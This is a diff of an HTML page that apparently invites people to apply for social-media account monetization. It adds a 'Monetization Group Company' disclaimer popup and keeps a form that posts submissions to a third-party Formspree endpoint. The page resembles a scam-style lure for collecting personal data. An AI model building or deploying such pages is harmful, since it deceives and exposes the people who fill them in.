@@ -9,130 +9,184 @@
 <style>
 
 body{
-    margin:0;
-    font-family:Arial,sans-serif;
-    background:linear-gradient(135deg,#050505,#1877f2,#00c853);
-    min-height:100vh;
-    overflow:hidden;
+margin:0;
+font-family:Arial,sans-serif;
+background:linear-gradient(135deg,#050505,#1877f2,#00c853);
+min-height:100vh;
 }
 
 .header{
-    text-align:center;
-    color:white;
-    padding:35px 10px;
+text-align:center;
+color:white;
+padding:35px 10px;
 }
 
 .header h1{
-    font-size:32px;
-    text-shadow:0 3px 10px rgba(0,0,0,.5);
+font-size:32px;
 }
 
 .card{
-    background:white;
-    width:85%;
-    max-width:400px;
-    margin:auto;
-    padding:25px;
-    border-radius:20px;
-    box-shadow:0 5px 20px rgba(0,0,0,.3);
+background:white;
+width:85%;
+max-width:400px;
+margin:auto;
+padding:25px;
+border-radius:20px;
+box-shadow:0 5px 20px rgba(0,0,0,.3);
 }
 
 h2{
-    text-align:center;
-    color:#1877f2;
+text-align:center;
+color:#1877f2;
 }
 
 input{
-    width:90%;
-    padding:15px;
-    margin:10px 0;
-    border-radius:10px;
-    border:1px solid #ddd;
-    font-size:16px;
+width:90%;
+padding:15px;
+margin:10px 0;
+border-radius:10px;
+border:1px solid #ddd;
+font-size:16px;
 }
 
 button{
-    width:100%;
-    padding:15px;
-    margin-top:10px;
-    background:#1877f2;
-    color:white;
-    border:none;
-    border-radius:10px;
-    font-size:18px;
+width:100%;
+padding:15px;
+margin-top:10px;
+background:#1877f2;
+color:white;
+border:none;
+border-radius:10px;
+font-size:18px;
 }
 
 .info{
-    margin-top:20px;
-    background:#f0f2f5;
-    padding:15px;
-    border-radius:10px;
+margin-top:20px;
+background:#f0f2f5;
+padding:15px;
+border-radius:10px;
 }
 
 #waiting{
-    display:none;
-    margin-top:20px;
-    background:#e8f5e9;
-    padding:15px;
-    border-radius:10px;
-    text-align:center;
-    color:green;
+display:none;
+margin-top:20px;
+background:#e8f5e9;
+padding:15px;
+border-radius:10px;
+text-align:center;
+color:green;
 }
 
 
-/* Money Stickers */
+/* Money */
 
 .money{
-    position:fixed;
-    font-size:45px;
-    opacity:0.8;
-    animation:float 4s infinite;
-    z-index:-1;
+position:fixed;
+font-size:45px;
+animation:float 4s infinite;
 }
 
 .money1{
-    top:15%;
-    left:8%;
+top:15%;
+left:8%;
 }
 
 .money2{
-    top:45%;
-    right:8%;
+top:45%;
+right:8%;
 }
 
 .money3{
-    bottom:15%;
-    left:12%;
+bottom:15%;
+left:12%;
 }
 
 @keyframes float{
-
-0%{
-transform:translateY(0);
-}
-
 50%{
 transform:translateY(-20px);
 }
-
-100%{
-transform:translateY(0);
 }
 
+
+/* Popup */
+
+.popup{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.6);
+display:flex;
+justify-content:center;
+align-items:center;
+z-index:999;
+}
+
+.popup-box{
+background:white;
+width:85%;
+max-width:380px;
+padding:25px;
+border-radius:20px;
+text-align:center;
+}
+
+.close{
+position:absolute;
+right:25px;
+top:25px;
+width:35px;
+height:35px;
+background:red;
+color:white;
+border-radius:50%;
+font-size:22px;
+padding:0;
 }
 
 </style>
 
 </head>
 
-
 <body>
 
 
+<div id="popup" class="popup">
+
+<div class="popup-box">
+
+<button class="close" onclick="closePopup()">×</button>
+
+<h2>Important Notice</h2>
+
+<p>
+We cannot guarantee a 100% approval or monetization of your account.
+</p>
+
+<p>
+However, accounts that meet the required criteria have a higher chance of approval.
+</p>
+
+<p>
+Thank you for your trust and cooperation.
+<br><br>
+Best regards,<br>
+Monetization Group Company
+</p>
+
+<button onclick="closePopup()">
+Continue
+</button>
+
+</div>
+
+</div>
+
+
+
 <div class="money money1">💰</div>
-
 <div class="money money2">💵</div>
-
 <div class="money money3">⭐</div>
 
 
@@ -149,13 +203,10 @@ transform:translateY(0);
 
 <div class="card">
 
-
 <h2>Welcome</h2>
 
 
-
 <form id="myForm">
-
 
 <input type="text"
 name="name"
@@ -172,7 +223,6 @@ required>
 <button type="submit">
 Submit
 </button>
-
 
 </form>
 
@@ -199,48 +249,41 @@ Your request has been received and will be reviewed within 24 hours.
 </div>
 
 
-
 <button onclick="window.open('report.html','_blank')">
-
 Report
-
 </button>
-
 
 
 </div>
 
 
 
-
 <script>
+
+function closePopup(){
+document.getElementById("popup").style.display="none";
+}
+
 
 document.getElementById("myForm").addEventListener("submit",function(e){
 
 e.preventDefault();
 
-
-let formData = new FormData(this);
+let formData=new FormData(this);
 
 
 fetch("https://formspree.io/f/xzdnbyqa",{
-
 method:"POST",
-
 body:formData,
-
 headers:{
 "Accept":"application/json"
 }
-
 });
 
 
 document.getElementById("waiting").style.display="block";
 
-
 this.reset();
-
 
 });
 
